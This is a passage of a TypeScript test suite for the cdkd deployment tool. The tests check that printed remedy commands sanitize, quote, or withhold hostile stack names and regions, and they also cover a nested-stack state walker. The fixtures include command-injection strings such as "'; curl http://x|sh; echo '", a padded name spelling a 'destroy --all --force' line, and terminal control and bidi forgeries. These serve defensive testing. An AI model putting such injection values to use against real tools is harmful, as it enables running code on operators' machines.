          [longRefreshable]: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
          [longRefused]: {
            physicalId: 'p2',
            resourceType: 'AWS::SSM::Parameter',
            properties: {},
            observedBaselineRefused: true,
          },
        },
        outputs: {},
        lastModified: 0,
      },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );

    const messages = logger.warn.mock.calls.map((c) => String(c[0]));
    for (const [label, ch] of [
      ['refreshable', 'Q'],
      ['refused', 'Z'],
    ] as const) {
      const row = messages.find((m) => m.trim().startsWith(ch));
      expect(row, `the ${label} list printed no row`).toBeDefined();
      expect(row, `the ${label} id is no longer capped`).toContain(
        `${ch.repeat(255)} [cut: 4745 more characters withheld]`
      );
      expect(row, `the ${label} id is no longer capped at all`).not.toContain(ch.repeat(256));
      expect(row!.length).toBeLessThan(300);
    }
  });

  // `cdkd state refresh-observed` WRITES: it locks a record and rewrites its
  // `observedProperties`. So unlike the read-only `cdkd state show`, its command
  // is printed only when rendering left the stack name and region EXACTLY as
  // loaded, and withheld otherwise — a name that sanitizing or the cap altered
  // can resolve to a different stack that exists and rewrite THAT baseline.
  // Driven through both schema arms, which build the advice separately.
  function refreshAdviceFor(
    version: StackState['version'],
    stackName: string,
    region: string
  ): string {
    const logger = makeLogger();
    reportDriftBaselineGaps(
      {
        version,
        stackName,
        region,
        resources: {
          Refreshable: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
        },
        outputs: {},
        lastModified: 0,
      },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );
    const needle = version < 3 ? 'schema is v2' : 'lack an';
    const advice = logger.warn.mock.calls.map((c) => String(c[0])).find((m) => m.includes(needle));
    expect(advice, `v${version}: no advice was printed`).toBeDefined();
    return advice!;
  }

  for (const version of [10, 2] as const) {
    it(`v${version}: WITHHOLDS the refresh command when rendering altered the stack name`, () => {
      const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r', '\u200b'];
      for (const [label, stackName] of [
        // Sanitizing changes it: a control byte, a line forgery, a bidi override.
        ['a hostile name', `Evil${FORGERIES.join('')}'; curl http://x|sh; echo '`],
        // The maintainer's case: a NON-BREAKING space where a real stack has an
        // ordinary one sanitizes to that real stack's name.
        ['a name with a non-breaking space', 'Prod\u00a0Stack'],
        // The cap changes it.
        ['an over-long name', 'q'.repeat(5000)],
        // Nothing renderable: the stand-in is not a stack at all.
        ['a name with nothing renderable', '\u0000\u0001'],
      ] as const) {
        const advice = refreshAdviceFor(version, stackName, 'r');
        expect(advice, label).not.toMatch(/cdkd state refresh-observed \S/);
        expect(advice, label).toContain("'cdkd state refresh-observed' for this stack");
        expect(advice, label).toContain('The command is not printed');
        // The withheld advice still reads as a procedure: the CAPTURE step is
        // `refresh-observed` and the VERIFY step is `cdkd drift`, in that order.
        if (version >= 3) {
          expect(advice, label).toContain(
            "Capture a baseline before export with 'cdkd state refresh-observed' for this stack."
          );
          expect(advice.trimEnd(), label).toMatch(
            /Then run 'cdkd drift' to verify the stack matches AWS\.$/
          );
        }
        for (const forge of FORGERIES) expect(advice, label).not.toContain(forge);
        // Withheld, not buried: the advice stays short however long the name.
        expect(advice.length, label).toBeLessThan(800);
      }
    });

    it(`v${version}: WITHHOLDS the refresh command when the stack name reads as an OPTION`, () => {
      // Exactness is not the whole rule, and this half is the one a later edit
      // drops: `--all` RENDERS exactly and `shellQuote` leaves it bare (every
      // character is in the ASCII allowlist), so the printed command would be
      // `cdkd state refresh-observed --all --stack-region '...'` — the flag
      // that rewrites every record in the region, not the one record the
      // sentence beside it names. A prebuilt cloud assembly supplies this name
      // unvalidated, so it is reachable.
      for (const [label, stackName, printed] of [
        ['the flag itself', '--all', 'option'],
        ['a single leading hyphen', '-x', 'option'],
        // Only the LEADING-hyphen half of `cdkd deploy`'s sibling gate applies
        // here, and these three rows are what stops that gate being copied
        // whole: `cdkd state refresh-observed` resolves its argument by exact
        // name equality (`r.stackName === stackName`), so a `*` or a `/`
        // selects at most the one record literally named that and cannot widen
        // the target the way a pattern does. Both ARE withheld — by the
        // plain-identifier rule, since neither character is one — and the
        // sentence says so; what is pinned is that it is NOT the pattern
        // sentence, i.e. `patternMatched` stays unpassed.
        ['a wildcard after a prefix', 'Prod-*', 'not-plain'],
        ['a display path', 'App/Stack', 'not-plain'],
        ['an inner hyphen', 'My-App-Stack', 'printed'],
      ] as const) {
        const advice = refreshAdviceFor(version, stackName, 'us-east-1');
        if (printed === 'printed') {
          expect(advice, label).toContain('cdkd state refresh-observed');
          expect(advice, label).not.toContain('The command is not printed');
        } else {
          expect(advice, label).not.toMatch(/cdkd state refresh-observed \S/);
          // The withheld sentence names THIS cause. The exactness wording
          // would be false here — the name renders exactly.
          expect(advice, label).not.toContain('cannot be rendered exactly');
          expect(advice, label).not.toContain('pattern character');
          expect(advice, label).toContain(
            printed === 'option'
              ? "this stack's name starts with '-', which cdkd refuses rather than risk the CLI reading it as an option however it is quoted"
              : "this stack's name is not a plain identifier"
          );
        }
      }
    });

    it(`v${version}: WITHHOLDS the refresh command when rendering altered the region`, () => {
      // A non-breaking space, and a cut at the region cap (one over it: the
      // gate's `maxCodePoints`, which is what the sentence must be keyed on —
      // M3 of the go-to-k/cdkd#3764 review — rather than printing
      // `--stack-region '<region>'` with no sentence).
      for (const region of [`us-east-1\u00a0`, 'r'.repeat(129), 'r'.repeat(200)]) {
        const advice = refreshAdviceFor(version, 'S', region);
        expect(advice, region.slice(0, 12)).not.toMatch(/cdkd state refresh-observed \S/);
        expect(advice, region.slice(0, 12)).not.toContain("'<region>'");
        expect(advice, region.slice(0, 12)).toContain(
          "The command is not printed: this stack's region as cdkd loaded it cannot be rendered exactly"
        );
      }
    });

    it(`v${version}: WITHHOLDS the refresh command when a value is not a PLAIN identifier`, () => {
      // `plainIdent` on both values (M2 of the go-to-k/cdkd#3764 review): each
      // of these renders exactly and starts with no `-`, so exactness and the
      // option arm admit it and only the plain-identifier rule withholds — a
      // padded name spells a labelled line once the terminal wraps, and a
      // shell-quoted one is what an operator strips.
      const padded = `Prod${' '.repeat(60)}Migrate with: cdkd destroy --all --force #`;
      for (const [label, stackName, region, what] of [
        ['a padded stack name', padded, 'us-east-1', "this stack's name"],
        ['a stack name with a quote', "It's Stack", 'us-east-1', "this stack's name"],
        ['a region with a space', 'S', 'us east', "this stack's region"],
      ] as const) {
        const advice = refreshAdviceFor(version, stackName, region);
        expect(advice, label).not.toMatch(/cdkd state refresh-observed \S/);
        expect(advice, label).not.toContain("'<region>'");
        expect(advice, label).not.toContain("'<stack>'");
        expect(advice, label).toContain(
          `The command is not printed: ${what} is not a plain identifier (a letter or digit, then letters, digits, '~', '_', '.' or '-')`
        );
        expect(advice, label).not.toContain('cannot be rendered exactly');
        expect(advice, label).not.toContain("starts with '-'");
      }
      // BOTH values refused, for different reasons: the sentence is about the
      // FIRST the gate refused — the stack name, in the gate's own order — so
      // it names the name's option shape, not the region's plainness.
      const both = refreshAdviceFor(version, '--all', 'us east');
      expect(both).not.toMatch(/cdkd state refresh-observed \S/);
      expect(both).toContain("The command is not printed: this stack's name starts with '-'");
      expect(both).not.toContain("this stack's region");
    });

    // The gate measured against what production passes: the LOADED identity.
    // Every case above passes none, so the stack name and region equal the
    // body's — and a gate that tested the BODY instead of the loaded values
    // passed all of them while printing a writing command for a loaded name
    // that sanitizing altered.
    function refreshAdviceLoaded(
      body: { stackName: string; region: string },
      loaded: { stackName: string; region: string | undefined }
    ): string {
      const logger = makeLogger();
      reportDriftBaselineGaps(
        {
          version,
          ...body,
          resources: {
            Refreshable: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
          },
          outputs: {},
          lastModified: 0,
        },
        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>,
        loaded
      );
      return logger.warn.mock.calls.map((c) => String(c[0])).join('\n');
    }

    it(`v${version}: gates on the LOADED name and region, not the record body`, () => {
      const clean = { stackName: 'App', region: 'us-east-1' };
      const hostile = { stackName: 'Other\u00a0Stack', region: 'us-east-1\u00a0' };
      // Clean body, altered loaded NAME: withheld.
      expect(
        refreshAdviceLoaded(clean, { stackName: 'Prod\u00a0Stack', region: 'us-east-1' })
      ).not.toMatch(/cdkd state refresh-observed \S/);
      // Clean body, altered loaded REGION: withheld.
      expect(
        refreshAdviceLoaded(clean, { stackName: 'App', region: 'us-east-1\u00a0' })
      ).not.toMatch(/cdkd state refresh-observed \S/);
      // Altered body, clean loaded identity: PRINTED, from the loaded values.
      expect(refreshAdviceLoaded(hostile, clean)).toContain(
        'cdkd state refresh-observed App --stack-region us-east-1'
      );
      // The OPTION half of the gate reads the same identity. Clean body, loaded
      // name `--all`: withheld, with that cause named — a gate keyed on the
      // body would print the region-wide command here.
      const optionWithheld = refreshAdviceLoaded(clean, {
        stackName: '--all',
        region: 'us-east-1',
      });
      expect(optionWithheld).not.toMatch(/cdkd state refresh-observed \S/);
      expect(optionWithheld).toContain('refuses rather than risk the CLI reading it as an option however it is quoted');
      // Body `--all`, clean loaded identity: PRINTED, since the body is not
      // what the command is built from.
      expect(refreshAdviceLoaded({ stackName: '--all', region: 'us-east-1' }, clean)).toContain(
        'cdkd state refresh-observed App --stack-region us-east-1'
      );
    });

    it(`v${version}: advises MIGRATING, not a refresh command, for a region-less load`, () => {
      // A legacy record: the call sites pass no region, and an EMPTY one is
      // treated the same. `cdkd state refresh-observed` refuses such a record
      // outright, so printing its command would recommend a guaranteed refusal.
      // The body's own region is not a substitute — it is the value the loaded
      // identity exists to displace.
      for (const region of [undefined, ''] as const) {
        const advice = refreshAdviceLoaded(
          { stackName: 'App', region: 'eu-west-1' },
          { stackName: 'App', region }
        );
        expect(advice).not.toMatch(/cdkd state refresh-observed \S/);
        expect(advice).not.toContain('--stack-region');
        expect(advice).toContain('this record has no region');
        expect(advice).toContain('migrate it first with any cdkd write, such as a deploy.');
      }
    });

    it(`v${version}: PRINTS the refresh command, shell-quoted and last, when rendering left it exact`, () => {
      // The other direction: without it, withholding unconditionally leaves
      // every case above green. `Parent~Child` needs QUOTING but not
      // sanitizing — `~` is outside the unquoted class — so it is exact and the
      // command is printed, quoted, with its region, as the whole tail.
      const advice = refreshAdviceFor(version, 'Parent~Child', 'us-east-1');
      expect(advice.trimEnd().endsWith(
        "cdkd state refresh-observed 'Parent~Child' --stack-region us-east-1"
      )).toBe(true);
      expect(advice).not.toContain('The command is not printed');

      // LONG names that fit the STACK cap are exact too: past a region's 128
      // and at exactly 1152. A gate measuring the name against the wrong cap
      // would withhold these legitimate nested names.
      for (const length of [129, 1152]) {
        const name = `P~${'x'.repeat(length - 2)}`;
        const long = refreshAdviceFor(version, name, 'us-east-1');
        expect(long.trimEnd().endsWith(
          `cdkd state refresh-observed '${name}' --stack-region us-east-1`
        ), `a ${length}-code-point name was withheld`).toBe(true);
      }
    });
  }

  it('does not say "and 0 more" at EXACTLY the ten-name cap', () => {
    // The boundary the eleven-row case above does not reach: with `> 10`
    // widened to `>= 10` a ten-row record gains an `... and 0 more` line, and
    // every other case here stays green.
    const logger = makeLogger();
    const resources: Record<string, unknown> = {};
    for (let i = 0; i < 10; i++) resources[`Broken${i}`] = null;
    reportDriftBaselineGaps(
      {
        version: 10,
        stackName: 'S',
        region: 'r',
        resources: resources as never,
        outputs: {},
        lastModified: 0,
      },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );

    const messages = logger.warn.mock.calls.map((c) => String(c[0]));
    expect(messages.filter((m) => /^ {2}Broken\d+$/.test(m))).toHaveLength(10);
    expect(messages.some((m) => /and -?\d+ more/.test(m))).toBe(false);
  });

  it('does not say "and N more" BELOW the ten-name cap either', () => {
    // `unreadable.length > 10` widened to `!== 10` is true for every count
    // under the cap, so one broken row would print "and -9 more". The exact-cap
    // case cannot reach that arm.
    for (const count of [1, 5, 9]) {
      const logger = makeLogger();
      const resources: Record<string, unknown> = {};
      for (let i = 0; i < count; i++) resources[`Broken${i}`] = null;
      reportDriftBaselineGaps(
        {
          version: 10,
          stackName: 'S',
          region: 'r',
          resources: resources as never,
          outputs: {},
          lastModified: 0,
        },
        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
      );
      const messages = logger.warn.mock.calls.map((c) => String(c[0]));
      expect(messages.filter((m) => /^ {2}Broken\d+$/.test(m))).toHaveLength(count);
      expect(
        messages.some((m) => /and -?\d+ more/.test(m)),
        `${count} rows below the cap gained an overflow summary`
      ).toBe(false);
    }
  });

  it('the PRE-v3 advice takes the same repair-first branch', () => {
    // The legacy arm is a second copy of the advice and was fixed a round after
    // the v3+ one. Forcing its conditional to `false` restored a recommendation
    // to run a command that refuses, and every other case here stayed green:
    // the only v2 case asserted the warning COUNT and the schema text.
    const withBroken = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 2,
        stackName: 'S',
        region: 'r',
        resources: {
          Refreshable: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
          BrokenRow: null as never,
        },
        outputs: {},
        lastModified: 0,
      },
      withBroken as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );
    const legacy = withBroken.warn.mock.calls
      .map((c) => String(c[0]))
      .find((m) => m.includes('schema is v2'));
    expect(legacy).toBeDefined();
    expect(legacy).toContain('Repair the 1 unreadable record(s) named above first');
    // It NAMES the command, as the thing that refuses; what it must not do is
    // OFFER it — the other arm's `or run: <command>` shape, which is what a
    // reader pastes.
    expect(legacy).not.toContain('or run: cdkd state refresh-observed');

    // The other arm, whose command carries the stack name, is driven by the
    // `v2:` WITHHOLDS / PRINTS cases above.
  });

  it('sanitizes, caps and stands in for the stack name in the INSPECT command too', () => {
    // A different command from the refresh advice, built in a different branch:
    // replacing its sanitizing helper with the raw name survived every
    // other case, because the only stack fixture reaching it carried shell
    // metacharacters (which `shellQuote` handles) and nothing the ALLOWLIST is
    // for.
    const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r', '\u200b'];
    function inspectLineFor(stackName: string): string | undefined {
      const logger = makeLogger();
      reportDriftBaselineGaps(
        {
          version: 10,
          stackName,
          region: 'r',
          resources: { BrokenRow: null as never },
          outputs: {},
          lastModified: 0,
        },
        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
      );
      return logger.warn.mock.calls.map((c) => String(c[0])).find((m) => m.includes('cdkd state show'));
    }

    const hostile = inspectLineFor(`Evil${FORGERIES.join('')}Stack`);
    expect(hostile).toBeDefined();
    for (const forge of FORGERIES) expect(hostile).not.toContain(forge);

    // 1152, not 128: a cdkd record's stack name is `parent~child` applied
    // recursively, so `STACK_REF_MAX_CODE_POINTS` is the cap a legitimate
    // nested name needs — capping it at an identifier's 128 emitted a remedy
    // command naming a stack that does not exist.
    const long = inspectLineFor('q'.repeat(5000));
    // The whole of this line IS the command -- it carries no prose display of
    // the name beside it -- so the over-cap name is withheld outright since
    // go-to-k/cdkd#3436's fold-in rather than printed truncated. That is a
    // BEHAVIOUR CHANGE and the better one: `q...q...` cut at 1152 addresses a
    // different record than the message means, which is the harm the cap's own
    // note describes one step further on. The cap still governs what the PROSE
    // may display elsewhere; it is no longer a licence to name a cut value in
    // something the operator pastes.
    expect(long).toContain(`cdkd state show '<stack>'`);
    expect(long, 'a truncated name must never be NAMED in a command').not.toMatch(/q{10,}/);
    // The remedy is still on screen after the cap — a DISTANCE, sized to the
    // wider identifier rather than to the old one.
    expect(long!.length).toBeLessThan(1600);

    // Nothing renderable left becomes a quoted HOLE rather than an empty
    // argument, which `cdkd state show` would read as no stack at all. It was
    // `<unrenderable>` before go-to-k/cdkd#3436's fold-in; both are quoted
    // stand-ins that close the empty-argument hazard, and the hole additionally
    // says WHICH argument is missing so the operator can fill it.
    expect(inspectLineFor('\u0000\u0001')).toContain(`cdkd state show '<stack>'`);
    expect(inspectLineFor('\u0000\u0001'), 'never an empty argument').not.toMatch(
      /cdkd state show\s+--/
    );
  });

  it('stands in for an id or stack name with nothing renderable, at every position', () => {
    // `<unrenderable>` is the other half of the same helper, and the oversized
    // and hostile fixtures elsewhere do not reach it: removing the stand-in
    // from the refreshable list or the refused list left every case green,
    // because the only empty-after-sanitization fixture was in the unreadable
    // list. An empty id prints a bullet naming nothing. (For the refresh
    // command, a blank name WITHHOLDS the command rather than standing in.)
    const BLANK = '\u0000\u0001';

    // The two ID lists, in one record so both are printed.
    const ids = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 10,
        stackName: 'S',
        region: 'r',
        resources: {
          [BLANK]: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
          [`${BLANK}\u0002`]: {
            physicalId: 'p2',
            resourceType: 'AWS::SSM::Parameter',
            properties: {},
            observedBaselineRefused: true,
          },
        },
        outputs: {},
        lastModified: 0,
      },
      ids as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );
    const idRows = ids.warn.mock.calls.map((c) => String(c[0])).filter((m) => m.startsWith('  '));
    // BOTH lists, each with its own empty-after-sanitization id: an earlier cut
    // gave the refused one a name that sanitized to `2`, so removing that
    // list's stand-in survived. A count of two is what makes this a
    // per-position assertion rather than a claim about one of them.
    expect(idRows.filter((m) => m.trim() === '<unrenderable>')).toHaveLength(2);
    // ...and both lists really were printed, or the count above is about rows
    // that never happened.
    const summaries = ids.warn.mock.calls.map((c) => String(c[0]));
    expect(summaries.some((m) => m.includes('lack an'))).toBe(true);
    expect(summaries.some((m) => m.includes('REFUSED'))).toBe(true);

    // The two refresh commands, one per schema version.
    for (const [version, needle] of [
      [10, 'refresh-observed'],
      [2, 'schema is v2'],
    ] as const) {
      const logger = makeLogger();
      reportDriftBaselineGaps(
        {
          version,
          stackName: BLANK,
          region: 'r',
          resources: {
            Refreshable: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
          },
          outputs: {},
          lastModified: 0,
        },
        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
      );
      const advice = logger.warn.mock.calls.map((c) => String(c[0])).find((m) => m.includes(needle));
      expect(advice, `v${version}: no advice was printed`).toBeDefined();
      // WITHHELD rather than stood in for: a WRITING command addressed to
      // `'<unrenderable>'` names no stack the reader can mean.
      expect(advice, `v${version}: a refresh command was printed for a blank name`).not.toMatch(
        /cdkd state refresh-observed \S/
      );
      expect(advice).toContain('The command is not printed');
    }
  });

  it('gives the plain refresh advice when every entry is readable', () => {
    // The other direction for the conditional above: without this, hard-coding
    // the repair-first branch leaves the case above green while removing the
    // advice this function exists to give.
    const logger = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 10,
        stackName: 'MyStack',
        region: 'r',
        resources: {
          Refreshable: { physicalId: 'p2', resourceType: 'AWS::SQS::Queue', properties: {} },
        },
        outputs: {},
        lastModified: 0,
      },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );

    const refreshAdvice = logger.warn.mock.calls
      .map((c) => String(c[0]))
      .find((m) => m.includes('refresh-observed'));
    expect(refreshAdvice).toBeDefined();
    expect(refreshAdvice).not.toContain('Repair the');
    // The command is emitted LAST and carries the stack name, so it is
    // pasteable as printed.
    expect(refreshAdvice!.trimEnd()).toMatch(
      /cdkd state refresh-observed MyStack --stack-region r$/
    );
  });
});

// -----------------------------------------------------------------------------
// Issue #464 PR B1 — `cdkd export` recursive nested-stack walker (state side).
// PR B1 lifts `AWS::CloudFormation::Stack` from `NEVER_IMPORTABLE_TYPES` and
// routes the row through a dedicated branch in `buildImportPlan` that
// surfaces a `nestedStackRows: NestedStackRow[]` list. The orchestrator
// uses `buildCdkdStateStackTree` to recursively load every child state
// file (fails fast on a torn tree) and then hard-errors with a PR B2
// pointer — the actual CFn `--include-nested-stacks` IMPORT changeset
// submission lands in PR B2.
// -----------------------------------------------------------------------------

/** Build a `StackState` shape matching schema v6, with the minimal fields the tests touch. */
function makeState(args: {
  stackName: string;
  region: string;
  resources?: Record<string, { resourceType: string; physicalId?: string }>;
  parentStack?: string;
  parentLogicalId?: string;
}): StackState {
  const resources: StackState['resources'] = {};
  for (const [logicalId, r] of Object.entries(args.resources ?? {})) {
    resources[logicalId] = {
      physicalId: r.physicalId ?? `phy-${logicalId}`,
      resourceType: r.resourceType,
      properties: {},
      attributes: {},
      dependencies: [],
    };
  }
  return {
    version: 6,
    stackName: args.stackName,
    region: args.region,
    resources,
    outputs: {},
    lastModified: 0,
    ...(args.parentStack !== undefined && { parentStack: args.parentStack }),
    ...(args.parentLogicalId !== undefined && { parentLogicalId: args.parentLogicalId }),
    ...(args.parentStack !== undefined && { parentRegion: args.region }),
  };
}

/**
 * Minimal `S3StateBackend` mock that returns a state record keyed by
 * `${stackName}|${region}`. Returns `null` for unknown keys so the walker's
 * missing-child branch can be exercised. `migrationPending` is included
 * (always `undefined` in the mock) to match the real `S3StateBackend.getState`
 * shape — pre-emptive fidelity even though the walker does not consult it.
 */
function makeStateBackendMock(
  states: Record<string, StackState>
): Pick<S3StateBackend, 'getState'> {
  return {
    async getState(stackName: string, region: string) {
      const s = states[`${stackName}|${region}`];
      if (!s) return null;
      // Through the shared mirror, not a literal record: `getState` adopts the
      // KEY's region and reports a divergent body separately (#3328), and the
      // walker's region-mismatch refusal reads the REPORT.
      return readAtKeyRegion(s, region);
    },
  } as unknown as Pick<S3StateBackend, 'getState'>;
}

describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
  it('returns a single-node tree when the root has no nested children', async () => {
    const root = makeState({
      stackName: 'Root',
      region: 'us-east-1',
      resources: { Bucket: { resourceType: 'AWS::S3::Bucket' } },
    });
    const backend = makeStateBackendMock({ 'Root|us-east-1': root }) as S3StateBackend;
    const tree = await buildCdkdStateStackTree('Root', 'us-east-1', backend);
    expect(tree.stackName).toBe('Root');
    expect(tree.region).toBe('us-east-1');
    expect(tree.nestedChildren.size).toBe(0);
    expect(tree.state).toBe(root);
  });

  it('walks a one-level nested tree (parent -> two children)', async () => {
    const root = makeState({
      stackName: 'Root',
      region: 'us-east-1',
      resources: {
        ChildA: { resourceType: 'AWS::CloudFormation::Stack' },
        ChildB: { resourceType: 'AWS::CloudFormation::Stack' },
      },
    });
    const childA = makeState({
      stackName: 'Root~ChildA',
      region: 'us-east-1',
      resources: { Param: { resourceType: 'AWS::SSM::Parameter' } },
      parentStack: 'Root',
      parentLogicalId: 'ChildA',
    });
    const childB = makeState({
      stackName: 'Root~ChildB',
      region: 'us-east-1',
      resources: { Param: { resourceType: 'AWS::SSM::Parameter' } },
      parentStack: 'Root',
      parentLogicalId: 'ChildB',
    });
    const backend = makeStateBackendMock({
      'Root|us-east-1': root,
      'Root~ChildA|us-east-1': childA,
      'Root~ChildB|us-east-1': childB,
    }) as S3StateBackend;
    const tree = await buildCdkdStateStackTree('Root', 'us-east-1', backend);
    expect([...tree.nestedChildren.keys()].sort()).toEqual(['ChildA', 'ChildB']);
    expect(tree.nestedChildren.get('ChildA')!.stackName).toBe('Root~ChildA');
    expect(tree.nestedChildren.get('ChildB')!.stackName).toBe('Root~ChildB');
  });

  it('recurses into grandchildren (parent -> child -> grandchild)', async () => {
    const root = makeState({
      stackName: 'Root',
      region: 'us-east-1',
      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
    });
    const child = makeState({
      stackName: 'Root~Child',
      region: 'us-east-1',
      resources: { Grandchild: { resourceType: 'AWS::CloudFormation::Stack' } },
      parentStack: 'Root',
      parentLogicalId: 'Child',
    });
    const grandchild = makeState({
      stackName: 'Root~Child~Grandchild',
      region: 'us-east-1',
      resources: { Bucket: { resourceType: 'AWS::S3::Bucket' } },
      parentStack: 'Root~Child',
      parentLogicalId: 'Grandchild',
    });
    const backend = makeStateBackendMock({
      'Root|us-east-1': root,
      'Root~Child|us-east-1': child,
      'Root~Child~Grandchild|us-east-1': grandchild,
    }) as S3StateBackend;
    const tree = await buildCdkdStateStackTree('Root', 'us-east-1', backend);
    expect(tree.nestedChildren.size).toBe(1);
    const childNode = tree.nestedChildren.get('Child')!;
    expect(childNode.nestedChildren.size).toBe(1);
    const grandNode = childNode.nestedChildren.get('Grandchild')!;
    expect(grandNode.stackName).toBe('Root~Child~Grandchild');
    expect(grandNode.nestedChildren.size).toBe(0);
  });

  it('throws when the root state is missing', async () => {
    const backend = makeStateBackendMock({}) as S3StateBackend;
    await expect(buildCdkdStateStackTree('Root', 'us-east-1', backend)).rejects.toThrow(
      /No cdkd state found for stack 'Root'/
    );
  });

  it('throws when a child state is missing (torn tree)', async () => {
    const root = makeState({
      stackName: 'Root',
      region: 'us-east-1',
      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
    });
    // Note: NO child state in the mock — simulating a torn tree.
    const backend = makeStateBackendMock({ 'Root|us-east-1': root }) as S3StateBackend;
    await expect(buildCdkdStateStackTree('Root', 'us-east-1', backend)).rejects.toThrow(
      /missing nested-child 'Root~Child'/
    );
  });

  it('throws when a child state records a different region (cross-region nested-stack not allowed)', async () => {
    const root = makeState({
      stackName: 'Root',
      region: 'us-east-1',
      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
    });
    // Child's `state.region` deliberately diverges from the walker's
    // expected region. AWS does not support cross-region nested stacks
    // today (design §6) — fail fast rather than silently consume the
    // mismatched child.
    const child = makeState({
      stackName: 'Root~Child',
      region: 'us-west-2',
      resources: {},
      parentStack: 'Root',
      parentLogicalId: 'Child',
    });
    const backend = makeStateBackendMock({
      'Root|us-east-1': root,
      // Backend lookup happens on the parent's region, so register the
      // child under `(Root~Child, us-east-1)`. Since go-to-k/cdkd#3328 the
      // mismatch surfaces through `getState`'s `divergentBodyRegion` report
      // rather than through `childResult.state.region`, which the read
      // normalizes to the key's — the double mirrors that (`readAtKeyRegion`),
      // so this record still reaches the walker as a divergence.
      'Root~Child|us-east-1': child,
    }) as S3StateBackend;
    await expect(buildCdkdStateStackTree('Root', 'us-east-1', backend)).rejects.toThrow(
      /region mismatch.*state\.region='us-west-2'.*walked against region='us-east-1'/s
    );
  });

  it('keeps an over-long divergent region out of that refusal (go-to-k/cdkd#3328, go-to-k/cdkd#3950)', async () => {
    // A `region` field is unvalidated body content of any length, so an
    // uncapped render pushes the refusal's own explanation off the screen.
    // This was the last uncapped rendering of that value; the read side's warn
    // and the destroy refusal both bound it.
    const root = makeState({
      stackName: 'Root',
      region: 'us-east-1',
      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
    });
    const child = makeState({
      stackName: 'Root~Child',
      region: 'z'.repeat(5000),
      resources: {},
      parentStack: 'Root',
      parentLogicalId: 'Child',
    });
    const backend = makeStateBackendMock({
      'Root|us-east-1': root,
      'Root~Child|us-east-1': child,
    }) as S3StateBackend;

    const thrown = await buildCdkdStateStackTree('Root', 'us-east-1', backend).catch(
      (e: unknown) => e
    );
    const message = (thrown as Error).message;

    // Still the refusal. Since go-to-k/cdkd#3950 a region `displayIdent`
    // would cut is not a plain identifier, so it is described rather than
    // quoted by hand, and none of it reaches the message.
    expect(message).toContain('region mismatch');
    expect(message).toContain('has state.region=(not shown: it is not a plain identifier) but');
    expect(message).not.toContain('zzzz');
  });

  it.each([
    [
      'a shell metacharacter',
      "A'; curl http://x|sh; echo '",
      (m: string) => {
        // WITHHELD as not a plain identifier (go-to-k/cdkd#3997): the command
        // names neither value, so no metacharacter reaches the pasteable line.
        expect(m).not.toMatch(/cdkd state orphan [^\n]*curl/);
        expect(m).toContain(
          "its record's stack name is not a plain identifier (a letter or digit, then letters, " +
            "digits, '~', '_', '.' or '-'), which cdkd does not print on a command line."
        );
        expect(m.endsWith("Drop it with: cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(
          true
        );
      },
    ],
    [
      // The shape go-to-k/cdkd#3997 names: a name padded so a terminal wraps
      // part of it onto what reads as its own `…with: cdkd …` line. It renders
      // EXACTLY (medial spaces survive `displaySafe`), so only the
      // plain-identifier rule withholds it.
      'medial padding spelling a second command line',
      `A${' '.repeat(80)}Drop it with: cdkd state orphan X`,
      (m: string) => {
        // The command line carries holes, not the padded name, and since
        // go-to-k/cdkd#3950 the prose head describes it rather than naming it.
        expect(m.split('\n').at(-1)).toBe(
          "Drop it with: cdkd state orphan '<stack>' --stack-region '<region>'"
        );
        expect(m).toContain("its record's stack name is not a plain identifier");
        expect(m.endsWith("Drop it with: cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(
          true
        );
      },
    ],
    [
      'a TRAILING SPACE, which renders as a healthy sibling',
      'A ',
      (m: string) => {
        // WITHHELD: `displaySafe` trims, so `Root~A ` renders as `Root~A` and a
        // substituted command would delete the intact record of that name.
        expect(m).toContain("cdkd state orphan '<stack>' --stack-region '<region>'");
        // `--json`, not `--long`: the long listing renders through
        // `displayIdent`, which trims, so it hands back the very spelling this
        // arm refused (go-to-k/cdkd#3420).
        expect(m).toContain('cdkd state list --json');
        expect(m).not.toContain('--long');
        expect(m).toContain('replacing each quoted hole, quotes included, with the value decoded from its JSON string, then shell-quoted');
        // `state list --json` prints {stackName, region}, not a key.
        expect(m).toContain('act on the one whose stackName and region match');
        expect(m).not.toMatch(/cdkd state orphan 'Root~A'/);
        // The reason is the GATE's, for the value it withheld, and the note
        // sits BEFORE the command, which ends the message (go-to-k/cdkd#3436).
        expect(m).toContain(
          "The next line's command names neither value, because its record's stack name does " +
            'NOT render exactly (another record may render identically).'
        );
        expect(m.endsWith("Drop it with: cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(
          true
        );
      },
    ],
    [
      'a NEWLINE, which forges a line around the delete command',
      'A\n  cdkd state orphan Healthy',
      (m: string) => {
        expect(m.split('\n').some((line) => line.trim().startsWith('cdkd state orphan Healthy'))).toBe(
          false
        );
      },
    ],
  ])(
